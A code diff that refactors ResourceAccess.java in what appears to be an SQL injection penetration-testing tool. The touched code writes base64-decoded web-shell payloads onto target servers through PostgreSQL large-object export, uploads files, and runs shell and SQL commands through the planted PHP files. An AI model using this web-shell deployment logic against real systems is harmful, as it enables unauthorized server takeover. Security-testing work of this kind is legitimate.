@@ -84,6 +84,13 @@ public class ResourceAccess {
     private final List<CallableFile> callablesReadFile = new ArrayList<>();
     private final InjectionModel injectionModel;
     public static final String SQL_DOT_PHP = "sql.php";
+    public static final String EXPLOIT_DOT_UPL = "exploit.upl";
+    public static final String EXPLOIT_DOT_WEB = "exploit.web";
+    public static final String UPLOAD_SUCCESSFUL = "Upload successful: ack received for {}{}";
+    public static final String UPLOAD_FAILURE = "Upload failure: missing ack for {}{}";
+    public static final String LOID_NOT_FOUND = "Exploit loid not found";
+    public static final String ADD_LOID = "pg#add-loid";
+    public static final String WRITE_LOID = "sqlt#write-loid";
 
     public ResourceAccess(InjectionModel injectionModel) {
         this.injectionModel = injectionModel;
@@ -187,7 +194,7 @@ public class ResourceAccess {
 
     public void createExploitUploadSqlite(String pathExploit, String urlExploit, File fileToUpload) {
         String bodyExploit = StringUtil.base64Decode(
-                this.injectionModel.getMediatorUtils().getPropertiesUtil().getProperties().getProperty("exploit.upl")
+                this.injectionModel.getMediatorUtils().getPropertiesUtil().getProperty(ResourceAccess.EXPLOIT_DOT_UPL)
             )
             .replace(DataAccess.SHELL_LEAD, DataAccess.LEAD)
             .replace(DataAccess.SHELL_TRAIL, DataAccess.TRAIL);
@@ -207,9 +214,9 @@ public class ResourceAccess {
             try (InputStream streamToUpload = new FileInputStream(fileToUpload)) {
                 HttpResponse<String> result = this.upload(fileToUpload, urlSuccess, streamToUpload);
                 if (result.body().contains(DataAccess.LEAD +"y")) {
-                    LOGGER.log(LogLevelUtil.CONSOLE_SUCCESS, "Upload successful: ack received for {}{}", pathExploit, fileToUpload.getName());
+                    LOGGER.log(LogLevelUtil.CONSOLE_SUCCESS, ResourceAccess.UPLOAD_SUCCESSFUL, pathExploit, fileToUpload.getName());
                 } else {
-                    LOGGER.log(LogLevelUtil.CONSOLE_ERROR, "Upload failure: missing ack for {}{}", pathExploit, fileToUpload.getName());
+                    LOGGER.log(LogLevelUtil.CONSOLE_ERROR, ResourceAccess.UPLOAD_FAILURE, pathExploit, fileToUpload.getName());
                 }
             } catch (InterruptedException e) {
                 LOGGER.log(LogLevelUtil.IGNORE, e, e);
@@ -225,26 +232,32 @@ public class ResourceAccess {
 
     public void createExploitUploadPostgres(String pathExploit, String urlExploit, File fileToUpload) {
         String bodyExploit = StringUtil.base64Decode(
-                this.injectionModel.getMediatorUtils().getPropertiesUtil().getProperties().getProperty("exploit.upl")
+                this.injectionModel.getMediatorUtils().getPropertiesUtil().getProperty(ResourceAccess.EXPLOIT_DOT_UPL)
             )
             .replace(DataAccess.SHELL_LEAD, DataAccess.LEAD)
             .replace(DataAccess.SHELL_TRAIL, DataAccess.TRAIL);
 
-        var loid = this.getResult("SELECT lo_from_bytea(0, '"+ bodyExploit.replace("'", "\"") +"')::text", "pg#add-loid");
+        var loid = this.getResult(
+            String.format("SELECT lo_from_bytea(0, '%s')::text", bodyExploit.replace("'", "\"")),
+            ResourceAccess.ADD_LOID
+        );
         if (StringUtils.isEmpty(loid)) {
-            LOGGER.log(LogLevelUtil.CONSOLE_ERROR, "Exploit loid not found");
+            LOGGER.log(LogLevelUtil.CONSOLE_ERROR, ResourceAccess.LOID_NOT_FOUND);
             return;
         }
         var nameExploit = RandomStringUtils.secure().nextAlphabetic(8) +".php";
-        this.getResult("SELECT lo_export("+ loid +", '"+ pathExploit + nameExploit +"')::text", "sqlt#write-loid");
+        this.getResult(
+            String.format("SELECT lo_export(%s, '%s')::text", loid, pathExploit + nameExploit),
+            ResourceAccess.WRITE_LOID
+        );
 
         BinaryOperator<String> biFuncGetRequest = (String pathExploitFixed, String urlSuccess) -> {
             try (InputStream streamToUpload = new FileInputStream(fileToUpload)) {
                 HttpResponse<String> result = this.upload(fileToUpload, urlSuccess, streamToUpload);
                 if (result.body().contains(DataAccess.LEAD +"y")) {
-                    LOGGER.log(LogLevelUtil.CONSOLE_SUCCESS, "Upload successful: ack received for {}{}", pathExploit, fileToUpload.getName());
+                    LOGGER.log(LogLevelUtil.CONSOLE_SUCCESS, ResourceAccess.UPLOAD_SUCCESSFUL, pathExploit, fileToUpload.getName());
                 } else {
-                    LOGGER.log(LogLevelUtil.CONSOLE_ERROR, "Upload failure: missing ack for {}{}", pathExploit, fileToUpload.getName());
+                    LOGGER.log(LogLevelUtil.CONSOLE_ERROR, ResourceAccess.UPLOAD_FAILURE, pathExploit, fileToUpload.getName());
                 }
             } catch (InterruptedException e) {
                 LOGGER.log(LogLevelUtil.IGNORE, e, e);
@@ -272,39 +285,51 @@ public class ResourceAccess {
         };
 
         String bodyExploit = StringUtil.base64Decode(
-                this.injectionModel.getMediatorUtils().getPropertiesUtil().getProperties().getProperty("exploit.sql.pdo.pgsql")
+                this.injectionModel.getMediatorUtils().getPropertiesUtil().getProperty("exploit.sql.pdo.pgsql")
             )
             .replace(DataAccess.SHELL_LEAD, DataAccess.LEAD)
             .replace(DataAccess.SHELL_TRAIL, DataAccess.TRAIL);
 
-        var loid = this.getResult("SELECT lo_from_bytea(0, '"+ bodyExploit.replace("'", "\"") +"')::text", "pg#add-loid");
+        var loid = this.getResult(
+            String.format("SELECT lo_from_bytea(0, '%s')::text", bodyExploit.replace("'", "\"")),
+            ResourceAccess.ADD_LOID
+        );
         if (StringUtils.isEmpty(loid)) {
-            LOGGER.log(LogLevelUtil.CONSOLE_ERROR, "Exploit loid not found");
-            return bodyExploit;
+            LOGGER.log(LogLevelUtil.CONSOLE_ERROR, ResourceAccess.LOID_NOT_FOUND);
+            return StringUtils.EMPTY;
         }
         var nameExploit = RandomStringUtils.secure().nextAlphabetic(8) +".php";
-        this.getResult("SELECT lo_export("+ loid +", '"+ pathExploit + nameExploit +"')::text", "sqlt#write-loid");
+        this.getResult(
+            String.format("SELECT lo_export(%s, '%s')::text", loid, pathExploit + nameExploit),
+            ResourceAccess.WRITE_LOID
+        );
 
         return this.checkUrls(urlExploit, nameExploit, biFuncGetRequest);
     }
 
     public void createExploitWebPostgres(String remotePathFolder, String urlExploit) {
         String bodyExploit = StringUtil.base64Decode(
-                this.injectionModel.getMediatorUtils().getPropertiesUtil().getProperties().getProperty("exploit.web")
+                this.injectionModel.getMediatorUtils().getPropertiesUtil().getProperty(ResourceAccess.EXPLOIT_DOT_WEB)
             )
             .replace(DataAccess.SHELL_LEAD, DataAccess.LEAD)
             .replace(DataAccess.SHELL_TRAIL, DataAccess.TRAIL);
 
-        var loid = this.getResult("SELECT lo_from_bytea(0, '"+ bodyExploit.replace("'", "\"") +"')::text", "pg#add-loid");
+        var loid = this.getResult(
+            String.format("SELECT lo_from_bytea(0, '%s')::text", bodyExploit.replace("'", "\"")),
+            ResourceAccess.ADD_LOID
+        );
         if (StringUtils.isEmpty(loid)) {
-            LOGGER.log(LogLevelUtil.CONSOLE_ERROR, "Exploit loid not found");
+            LOGGER.log(LogLevelUtil.CONSOLE_ERROR, ResourceAccess.LOID_NOT_FOUND);
             return;
         }
         var nameExploit = RandomStringUtils.secure().nextAlphabetic(8) +".php";
-        this.getResult("SELECT lo_export("+ loid +", '"+ remotePathFolder + nameExploit +"')::text", "sqlt#write-loid");
+        this.getResult(
+            String.format("SELECT lo_export(%s, '%s')::text", loid, remotePathFolder + nameExploit),
+            ResourceAccess.WRITE_LOID
+        );
 
         BinaryOperator<String> biFuncGetRequest = (String pathExploitFixed, String urlSuccess) -> {
-            String result = this.runCommandShell(
+            String result = this.callCommand(
                 urlSuccess +"?c="+ URLEncoder.encode("echo \"iamin$((133707330+1))\"", StandardCharsets.ISO_8859_1)
             );
             if (!result.contains("iamin133707331")) {
@@ -340,7 +365,7 @@ public class ResourceAccess {
 
     public String createExploitWebSqlite(String remotePathFolder, String urlExploit) {
         String bodyExploit = StringUtil.base64Decode(
-                this.injectionModel.getMediatorUtils().getPropertiesUtil().getProperties().getProperty("exploit.web")
+                this.injectionModel.getMediatorUtils().getPropertiesUtil().getProperty("exploit.web")
             )
             .replace(DataAccess.SHELL_LEAD, DataAccess.LEAD)
             .replace(DataAccess.SHELL_TRAIL, DataAccess.TRAIL);
@@ -357,7 +382,7 @@ public class ResourceAccess {
         this.injectionModel.injectWithoutIndex(query, "sqlt#add-web");
 
         BinaryOperator<String> biFuncGetRequest = (String pathExploitFixed, String urlSuccess) -> {
-            String result = this.runCommandShell(
+            String result = this.callCommand(
                 urlSuccess +"?c="+ URLEncoder.encode("echo \"iamin$((133707330+1))\"", StandardCharsets.ISO_8859_1)
             );
             if (!result.contains("iamin133707331")) {
@@ -391,9 +416,9 @@ public class ResourceAccess {
             try (InputStream streamToUpload = new FileInputStream(fileToUpload)) {
                 HttpResponse<String> result = this.upload(fileToUpload, urlSuccess, streamToUpload);
                 if (result.body().contains(DataAccess.LEAD +"y")) {
-                    LOGGER.log(LogLevelUtil.CONSOLE_SUCCESS, "Upload successful: ack received for {}{}", pathExploit, fileToUpload.getName());
+                    LOGGER.log(LogLevelUtil.CONSOLE_SUCCESS, ResourceAccess.UPLOAD_SUCCESSFUL, pathExploit, fileToUpload.getName());
                 } else {
-                    LOGGER.log(LogLevelUtil.CONSOLE_ERROR, "Upload failure: missing ack for {}{}", pathExploit, fileToUpload.getName());
+                    LOGGER.log(LogLevelUtil.CONSOLE_ERROR, ResourceAccess.UPLOAD_FAILURE, pathExploit, fileToUpload.getName());
                 }
             } catch (InterruptedException e) {
                 LOGGER.log(LogLevelUtil.IGNORE, e, e);
@@ -403,7 +428,7 @@ public class ResourceAccess {
             }
             return urlSuccess;
         };
-        this.createExploit(pathExploit, urlExploit, "exploit.upl", "upl.php", biFuncGetRequest, pathNetshare, exploitMode);
+        this.createExploit(pathExploit, urlExploit, ResourceAccess.EXPLOIT_DOT_UPL, "upl.php", biFuncGetRequest, pathNetshare, exploitMode);
     }
 
     public String createExploitSqlMysql(String pathExploit, String urlExploit, String pathNetshare, ExploitMode exploitMode, String username, String password) throws JSqlException {
@@ -451,7 +476,7 @@ public class ResourceAccess {
         }
 
         String bodyExploit = StringUtil.base64Decode(
-            this.injectionModel.getMediatorUtils().getPropertiesUtil().getProperties().getProperty(keyPropertyExploit)
+            this.injectionModel.getMediatorUtils().getPropertiesUtil().getProperty(keyPropertyExploit)
         )
         .replace(DataAccess.SHELL_LEAD, DataAccess.LEAD)
         .replace(DataAccess.SHELL_TRAIL, DataAccess.TRAIL);
@@ -601,7 +626,7 @@ public class ResourceAccess {
         return urlSuccess;
     }
 
-    public String runCommandShell(String urlCommand) {
+    public String callCommand(String urlCommand) {
         String pageSource;
         try {
             pageSource = this.injectionModel.getMediatorUtils().getConnectionUtil().getSource(urlCommand);
@@ -618,7 +643,7 @@ public class ResourceAccess {
             result = regexSearch.group(1);
         } catch (IllegalStateException e) {
             result = StringUtils.EMPTY;  // fix return null from regex
-            LOGGER.log(LogLevelUtil.CONSOLE_ERROR, "Command failure: incorrect response from shell");
+            LOGGER.log(LogLevelUtil.CONSOLE_ERROR, String.format(UdfAccess.TEMPLATE_ERROR, "empty result", "command"));
         }
         return result;
     }
@@ -630,14 +655,12 @@ public class ResourceAccess {
      * @param urlExploit Web path of the shell
      */
     public String runWebShell(String command, UUID uuidShell, String urlExploit) {
-        String result = this.runCommandShell(
-            urlExploit +"?c="+ URLEncoder.encode(command.trim(), StandardCharsets.ISO_8859_1)
+        String result = this.callCommand(
+            urlExploit +"?c="+ URLEncoder.encode(command, StandardCharsets.ISO_8859_1)
         );
         if (StringUtils.isBlank(result)) {
-            // TODO Payload should redirect directly error to default output
-            result = "No result.\nTry '"+ command.trim() +" 2>&1' to get a system error message.\n";
+            result = String.format(UdfAccess.TEMPLATE_ERROR, "empty result", command);
         }
-
         var request = new Request();  // Unfreeze GUI terminal
         request.setMessage(Interaction.GET_EXPLOIT_WEB_RESULT);
         request.setParameters(uuidShell, result);
@@ -658,10 +681,10 @@ public class ResourceAccess {
     }
 
     public String runSqlShell(String command, UUID uuidShell, String urlExploit, String username, String password, boolean isWithView) {
-        String result = this.runCommandShell(String.format(
+        String result = this.callCommand(String.format(
              "%s?q=%s&u=%s&p=%s",
              urlExploit,
-             URLEncoder.encode(command.trim(), StandardCharsets.ISO_8859_1),
+             URLEncoder.encode(command, StandardCharsets.ISO_8859_1),
              username,
              password
         ));
